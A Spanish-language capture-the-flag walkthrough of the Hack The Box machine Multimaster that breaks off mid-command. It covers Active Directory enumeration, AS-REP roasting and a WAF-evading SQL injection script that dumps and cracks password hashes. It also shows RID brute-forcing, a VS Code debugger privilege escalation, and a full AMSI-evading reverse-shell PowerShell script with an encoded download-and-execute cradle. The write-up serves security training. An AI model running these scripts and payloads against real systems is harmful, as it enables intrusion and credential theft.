Microsoft Windows Active Directory LDAP (Domain: MEGACORP. LOCAL, Site: Default-First-Site-Name)445/tcp  open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: MEGACORP. LOCAL, Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=MULTIMASTER. MEGACORP. LOCAL| Not valid before: 2023-03-30T15:34:28|_Not valid after: 2023-09-29T15:34:28| rdp-ntlm-info: |  Target_Name: MEGACORP|  NetBIOS_Domain_Name: MEGACORP|  NetBIOS_Computer_Name: MULTIMASTER|  DNS_Domain_Name: MEGACORP. LOCAL|  DNS_Computer_Name: MULTIMASTER. MEGACORP. LOCAL|  DNS_Tree_Name: MEGACORP. LOCAL|  Product_Version: 10. 0. 14393|_ System_Time: 2023-03-31T15:43:32+00:00|_ssl-date: 2023-03-31T15:44:11+00:00; +6m58s from scanner time. 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing49666/tcp open msrpc     Microsoft Windows RPC49667/tcp open msrpc     Microsoft Windows RPC49674/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049675/tcp open msrpc     Microsoft Windows RPC49681/tcp open msrpc     Microsoft Windows RPC49698/tcp open msrpc     Microsoft Windows RPCService Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |  3. 1. 1: |_  Message signing enabled and required| smb-security-mode: |  account_used: &lt;blank&gt;|  authentication_level: user|  challenge_response: supported|_ message_signing: required| smb-os-discovery: |  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6. 3)|  Computer name: MULTIMASTER|  NetBIOS computer name: MULTIMASTER\x00|  Domain name: MEGACORP. LOCAL|  Forest name: MEGACORP. LOCAL|  FQDN: MULTIMASTER. MEGACORP. LOCAL|_ System time: 2023-03-31T08:43:32-07:00| smb2-time: |  date: 2023-03-31T15:43:36|_ start_date: 2023-03-31T15:34:34|_clock-skew: mean: 1h30m58s, deviation: 3h07m50s, median: 6m58sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 106. 97 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         53   DNS   Simple DNS Plus       80   HTTP   Microsoft IIS httpd 10. 0       88   KERBEROS   Microsoft Windows Kerberos       135   RPC   Microsoft Windows RPC       139   LDAP   Microsoft Windows netbios-ssn       445   SMB   ?       3389   RDP   Microsoft Terminal Services       5985   WINRM   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)   Ya que vemos que el puerto 445 esta abierto procederemos a enumerarlo, usando la herramienta crackmapexec: ❯ crackmapexec smb 10. 10. 10. 179SMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)Añadimos el domain a nuestro /etc/hosts echo  10. 10. 10. 179 MEGACORP. LOCAL  &gt;&gt; /etc/hostsExplotación #: Buscaremos si podemos listar recursos compartidos, para ello podemos hacer uso de smbmap con los parametros -H para especificar el host y -u para hacer uso de una sesion nula. ❯ smbmap -H 10. 10. 10. 179 -u 'null'[!] Authentication error on 10. 10. 10. 179Vemos que no contamos con acceso por smb , seguidamente probaremos a tratat de enumerar usuarios del sistema por rpc con rpcclient y de igual manera no tenemos acceso. ❯ rpcclient -U    10. 10. 10. 179 -Nrpcclient $&gt; enumdomusersresult was NT_STATUS_ACCESS_DENIEDrpcclient $&gt; Entonces procederemos a abrir la pagina web correspondiente a un IIS.  Despues de enumerar un rato la pagina web, en la opcion colleague finder realizamos una busqueda que nos reporta una lista de usuarios.  ❯ cat users. txtsbauerokentckanekpageshaynajamesrmartinjordenalyxileenbournezpowersaldomminatoVamos a validar si los usuarios son validos usando la herramienta kerbrute  https://github. com/ropnop/kerbrute❯ /opt/kerbrute/kerbrute userenum --dc 10. 10. 10. 179 -d MEGACORP. LOCAL users. txt  __       __        __    / /_____ _____/ /_ _______ __/ /____  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; / __/ / / /_/ / / / /_/ / /_/ __//_/|_|\___/_/ /_. ___/_/  \__,_/\__/\___/                    Version: dev (n/a) - 03/31/23 - Ronnie Flathers @ropnop2023/03/31 18:45:44 &gt; Using KDC(s):2023/03/31 18:45:44 &gt; 	10. 10. 10. 179:882023/03/31 18:45:44 &gt; [+] VALID USERNAME:	ckane@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	okent@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	sbauer@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	rmartin@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	kpage@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	james@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	jorden@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	ilee@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	alyx@MEGACORP. LOCAL2023/03/31 18:45:44 &gt; [+] VALID USERNAME:	zpowers@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; [+] VALID USERNAME:	nbourne@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; [+] VALID USERNAME:	aldom@MEGACORP. LOCAL2023/03/31 18:45:45 &gt; Done! Tested 14 usernames (12 valid) in 0. 787 secondsComo nos encontramos en un entorno de directorio activo y es un domain controler, vamos a intentar realizar con los usuarios un ASREPRoast Attack, mediante el cual podemos solicituar un TGT sin conocer las contraseñas de los usuarios para obtener hashes que podemos crackear de forma offline. Para ello usaremos la herramienta de impakcet GetNpUsers. py.  https://github. com/fortra/impacket❯ GetNPUsers. py MEGACORP. LOCAL/ -no-pass -usersfile users. txtImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)Anteriormente veiamos que en Colleague Finder teniamos un input que vamos a proceder a interceptar con burpsite para tratar de causar un error en la consulta.  Cuando añadimos simbolos como la ', nos manda un mensaje de error 403 Forbidden y con otros simbolos un 200 ok, asi que vamos a intentar realizar fuerza bruta con wfuzz para entender que esta pasando, para ello usaremos un diccionario del repositorio de danielmiessler llamado special-chars. txt.  ❯ wfuzz -c -X POST -t 100 -w /opt/SecLists/Fuzzing/special-chars. txt -H 'Content-Type: application/json;charset=utf-8' -d '{ name : FUZZ }' -u http://10. 10. 10. 179/api/getColleagues /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 179/api/getColleaguesTotal requests: 32=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000007:  403    29 L   92 W    1233 Ch    ^                                                           000000015:  403    29 L   92 W    1233 Ch    =                                                           000000003:  403    29 L   92 W    1233 Ch    @                                                           000000001:  403    29 L   92 W    1233 Ch    ~                                                           000000016:  403    29 L   92 W    1233 Ch    {                                                           000000014:  403    29 L   92 W    1233 Ch    + Vemos que al usar muchos hilos en la peticion el servidor nos bloquea por la existencia de un WAF, para ello con usos adicionaremos unos parametros -s 1, para que mande una peticion por segundo y ocultaremos el codigo de estado 200 ❯ wfuzz -c -X POST --hc=200 -s 1 -w /opt/SecLists/Fuzzing/special-chars. txt -H 'Content-Type: application/json;charset=utf-8' -d '{ name : FUZZ }' -u http://10. 10. 10. 179/api/getColleagues /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 179/api/getColleaguesTotal requests: 32=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000004:  403    29 L   92 W    1233 Ch    #                                                           000000021:  500    0 L   4 W    36 Ch     \                                                           000000028:  403    29 L   92 W    1233 Ch    :                                                           000000029:  403    29 L   92 W    1233 Ch    '                                                           000000030:  403    29 L   92 W    1233 Ch                                                                000000031:  403    29 L   92 W    1233 Ch    &lt;                                                           000000032:  403    29 L   92 W    1233 Ch    &gt;                                                           Total time: 32. 39251Processed Requests: 32Filtered Requests: 25Requests/sec. : 0. 987882Al finalizar wfuzz nos muestra que la \ nos reporta un codigo de estado 500 Internal Server Error, que curiosamente usa sqlmap con el nombre de tamper para ofuzcar sus payloads como en el siguente ejemplo.  &gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')  '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045'A efectos practicos al mandar la peticion debemos usar \\u00 seguido de cada caracter en hexadecimal no es necesario usar tres \ con uno basta. Para no realizar la peticion una a una o usar sqlmap, vamos a realizarlo manualmente creandonos un script en python3: #!/usr/bin/python3from pwn import *import requests, time, json, signaldef def_handler(sig, frame):  print( \n[!] Saliendo. . . !\n )  sys. exit(1)#ctrl_c -&gt; al presionar nos ejecuta la funcion def_handlersignal. signal(signal. SIGINT, def_handler)#global_variablesmain_url =  http://10. 10. 10. 179/api/getColleagues #recibimos la data como input y la tratamos def recivesql(sqlinyection):  sqlmodified =     for character in sqlinyection:    sqlmodified +=  \\u00  + hex(ord(character))[2:]  return sqlmodified#realizamos la peticion enviando la data tratada y la representamos en formato jsondef sendsql(sqlmodified):  headers = {    'Content-Type': 'application/json;charset=utf-8'  }  data_post = '{ name :  %s }' % sqlmodified      r = requests. post(main_url, headers=headers, data=data_post)  data_json = json. loads(r. text)  return (json. dumps(data_json,indent=4))if __name__ == '__main__':#mediante un bucle recibimos la data como input  while True:    sqlinyection = input( &gt;  )    sqlinyection = sqlinyection. strip()    sqlmodified = recivesql(sqlinyection)    response_json = sendsql(sqlmodified)    print(response_json)Ejecutamos el script y realizamos una inyeccion sql. ❯ python3 sql_inject. py&gt; ttest' union select 1,schema_name,3,4,5 from information_schema. schemata-- -[  {     id : 1,     name :  db_accessadmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_backupoperator ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_datareader ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_datawriter ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_ddladmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_denydatareader ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_denydatawriter ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_owner ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  db_securityadmin ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  dbo ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  guest ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  INFORMATION_SCHEMA ,     position :  3 ,     email :  4 ,     src :  5   },  {     id : 1,     name :  sys ,     position :  3 ,     email :  4 ,     src :  5   }]&gt;Enumerando la base de datos dbo encontramos usuarios y contraseñas encriptadas. aldom:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739alyx:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfackane:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813cyork:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739egre55:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babcilee:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813james:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739jorden:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739kpage:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813minatotw:cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babcnbourne:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfaokent:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfarmartin:fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfasbauer:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739shayna:9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739zac:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813zpowers:68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813Usaremos hashcat para crackear los hashes, y logramos obtener 3 contraseñas. password1finance1banking1Ya que tenemos una lista de usuarios y contraeñas probamos a validar si alguna de ellas es valida con crackmapexec y nos reprota que ninguna es valida. ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p passwords --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\okent:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:finance1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\ckane:banking1 STATUS_LOGON_FAILURESim embargo debemos recordar que cuando nos encotramos en un entorno de directorio activo, podemos enumerar usuarios o informacion del DC a partir de inyecciones. &gt; test' union select 1,default_domain(),3,4,5-- -[  {     id : 1,     name :  MEGACORP ,     position :  3 ,     email :  4 ,     src :  5   }]&gt; Ahora con una query especifica vamos a lista el SID y RID correspondiente al usuario Administrator  SID Y RID: El Identificador Relativo (RID) es parte del Identificador de Seguridad (SID) en los dominios de Microsoft Windows. Es la parte del SID que identifica a un principal de seguridad (un usuario, grupo o equipo) en relación con la autoridad que expidió el SID. &gt; testt' union select 1,(select sys. fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))),3,4,5-- -[  {     id : 1,     name :  0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000 ,     position :  3 ,     email :  4 ,     src :  5   }]&gt;De el resultado que nos reporta los ultimos 8 caracteres corresponden al RDI, que viene a estar representado en hexadecimal si lo tratamos un poco. ❯ python3Python 3. 9. 2 (default, Feb 28 2021, 17:03:44) [GCC 10. 2. 1 20210110] on linuxType  help ,  copyright ,  credits  or  license  for more information. &gt;&gt;&gt; 0x01f4500&gt;&gt;&gt; hex(500)'0x1f4'&gt;&gt;&gt; hex(501)'0x1f5Si modificamos el rdi con el valor hexadecimal de 501, entonces correspondera a otro usuario, en este caso Ghest. &gt; test' union select 1,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f5010000)),3,4,5-- -[  {     id : 1,     name :  MEGACORP\\Guest ,     position :  3 ,     email :  4 ,     src :  5   }]Esto nos da la idea que podemos lista los usuarios del DC a partir de poder conmutar el RID, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor. #!/usr/bin/python3from pwn import *import requests, time, json, signaldef def_handler(sig, frame):  print( \n[!] Saliendo. . . !\n )  sys. exit(1)#ctrl_csignal. signal(signal. SIGINT, def_handler)#global_variablesmain_url =  http://10. 10. 10. 179/api/getColleagues sid =  0x0105000000000005150000001c00d1bcd181f1492bdfc236 #tratamos la datadef recivesql(sqlinyection):  sqlmodified =     for character in sqlinyection:    sqlmodified +=  \\u00  + hex(ord(character))[2:]  return sqlmodified#enviamos la data procesadadef sendsql(sqlmodified):  headers = {    'Content-Type': 'application/json;charset=utf-8'  }  data_post = '{ name :  %s }' % sqlmodified      r = requests. post(main_url, headers=headers, data=data_post)  data_json = json. loads(r. text)  return (json. dumps(data_json,indent=4))#obtebemos el RID en el formato adecuadodef getRID(i):  cadena = hex(i). replace( x ,  )  lista = []  for caracter in cadena:    lista. append(caracter)  rid = lista[2] + lista[3] + lista[0] +lista[1] +  0000   return ridif __name__ == '__main__':#establecemos un rango que casi siempre corresponden a los usuarios  for i in range(1100, 1200):    rid = getRID(i)    sqli =  ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -  % (sid, rid)    sqlmodified = recivesql(sqli)    response_json = sendsql(sqlmodified)    print(response_json)      time. sleep(2)Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios. ❯ python3 sql_inject. py[  {     id : 1,     name :   ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\DnsAdmins ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\DnsUpdateProxy ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\svc-nas ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\Privileged IT Accounts ,     position :  3 ,     email :  4 ,     src :  5   }][    {     id : 1,     name :  MEGACORP\\tushikikatomo ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\andrew ,     position :  3 ,     email :  4 ,     src :  5   }][  {     id : 1,     name :  MEGACORP\\lana ,     position :  3 ,     email :  4 ,     src :  5   }]Con estos nuevos usuarios validamos con crackmapexec y esta vez obtenemos unas credenciales validas correspondiente al usuario tushikikatomo ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p passwords --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\tushikikatomo:finance1 SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\lana:password1 STATUS_LOGON_FAILUREComo antes nmap nos reporto que el puerto 5985 estaba abierto intentaremos conectarnos con estas credenciales con evil-winrmy visualizamos la primera flag user. txt ❯ evil-winrm -i 10. 10. 10. 179 -u 'tushikikatomo' -p 'finance1'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; type user. txt9d5ca88b1cafe75450e0b7a7b03c7834Escalada de Privilegios #: Enumerando un poco el sistema encontramos que se ejecuta el proceso Code correspondiente a Visual Code *Evil-WinRM* PS C:\Users\alcibiades\Desktop&gt; Get-ProcessHandles NPM(K)  PM(K)   WS(K)   CPU(s)   Id SI ProcessName------- ------  -----   -----   ------   -- -- -----------  277   51  57564   74188        652  1 Code  576   39  30472   72024       1212  1 Code  403   53  96468   122704       5464  1 Code  315   31  37032   62272       5576  1 Code  397   21  16804   23172       5836  1 Code  194   15   6112   12432       6056  1 Code   63    4   708    3532       5832  0 CompatTelRunner   93    8   1308    5884       4092  0 conhostVamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version. *Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&gt; . \code -hVisual Studio Code 1. 37. 1Usage: code. exe [options][paths. . . ]Despues de realizar una busqueda encontramos el CVE-2019-1414 asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.  Mayor detalle en el articulo a continuacion:  https://iwantmore. pizza/posts/cve-2019-1414. htmlUsaremos la herramienta cefdebug de github para explotar esta vulnerabilidad  https://github. com/taviso/cefdebugNos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsed*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; copy \\10. 10. 16. 6\smbFolder\ceffdebug. exe ceffdebug. exePara ejecutarlo solo debemos seguir los pasos tal cual el repositorio. *Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. execeffdebug. exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . n state listen. :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers. [2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1[2023/04/02 09:05:32:5800] U: ws://127. 0. 0. 1:43978/c8928169-15af-4124-83a5-42b180e1b697*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. exe --url ws://127. 0. 0. 1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code  process. mainModule. require('child_process'). exec('ping 10. 10. 16. 6') ceffdebug. exe : [2023/04/02 09:05:58:8202] U: &gt;&gt;&gt; process. mainModule. require('child_process'). exec('ping 10. 10. 16. 6')  + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . ng 10. 10. 16. 6'):String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:05:58:8202] U: &lt;&lt;&lt; ChildProcessy al ponernos en escucha con tcpdump recibimos la traza icmp ❯ tcpdump -i tun0 -n icmptcpdump: verbose output suppressed, use -v[v]. . . for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes15:59:01. 108853 IP 10. 10. 10. 179 &gt; 10. 10. 16. 6: ICMP echo request, id 1, seq 1, length 4015:59:01. 108917 IP 10. 10. 16. 6 &gt; 10. 10. 10. 179: ICMP echo reply, id 1, seq 1, length 4015:59:02. 150656 IP 10. 10. 10. 179 &gt; 10. 10. 16. 6: ICMP echo request, id 1, seq 2, length 4015:59:02. 150666 IP 10. 10. 16. 6 &gt; 10. 10. 10. 179: ICMP echo reply, id 1, seq 2, length 40Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script Invoke-PowerShellTcp. ps1 del repositorio de nishang  NishangAhora para poder realizar AMSI bypass, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion. function dalecontodo {   [CmdletBinding(DefaultParameterSetName= reverse )] Param(    [Parameter(Position = 0, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 0, Mandatory = $false, ParameterSetName= bind )]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= bind )]    [Int]    $Port,    [Parameter(ParameterSetName= reverse )]    [Switch]    $Reverse,    [Parameter(ParameterSetName= bind )]    [Switch]    $Bind  )    try   {    if ($Reverse)    {      $client = New-Object System. Net. Sockets. TCPClient($IPAddress,$Port)    }    if ($Bind)    {      $listener = [System. Net. Sockets. TcpListener]$Port      $listener. start()        $client = $listener. AcceptTcpClient()    }     $stream = $client. GetStream()    [byte[]]$bytes = 0. . 65535|%{0}    $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )    $stream. Write($sendbytes,0,$sendbytes. Length)    $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt;')    $stream. Write($sendbytes,0,$sendbytes. Length)    while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0)    {      $EncodedText = New-Object -TypeName System. Text. ASCIIEncoding      $data = $EncodedText. GetString($bytes,0, $i)      try      {        $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )      }      catch      {        Write-Warning  Something went wrong with execution of command on the target.           Write-Error $_      }      $sendback2 = $sendback + 'PS ' + (Get-Location). Path + '&gt; '      $x = ($error[0] | Out-String)      $error. clear()      $sendback2 = $sendback2 + $x      $sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2)      $stream. Write($sendbyte,0,$sendbyte. Length)      $stream. Flush()     }    $client. Close()    if ($listener)    {      $listener. Stop()    }  }  catch  {    Write-Warning  Something went wrong! Check if the server is reachable and you are using the correct port.       Write-Error $_  }}dalecontodo -Reverse -IPAddress 10. 10. 16. 3 -Port 443En la maquina victima ejecutaremos una peticion al script con Iex para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos iconv y lo transformaremos a base64 de este modo poder ejecutar la peticion con powershell ❯ echo -n  IEX(New-Object Net. WebClient). downloadString('http://10. 10. 16. 3/PS. ps1')  | iconv -t utf-16le | base64 -w 0; echoSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkATeniendo el formato adecuando podemos pasar a ejecutar el cefdebug. Compartimos el PS. ps1 y seguidamente con rlwrap y ntcat ponernos en escucha. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 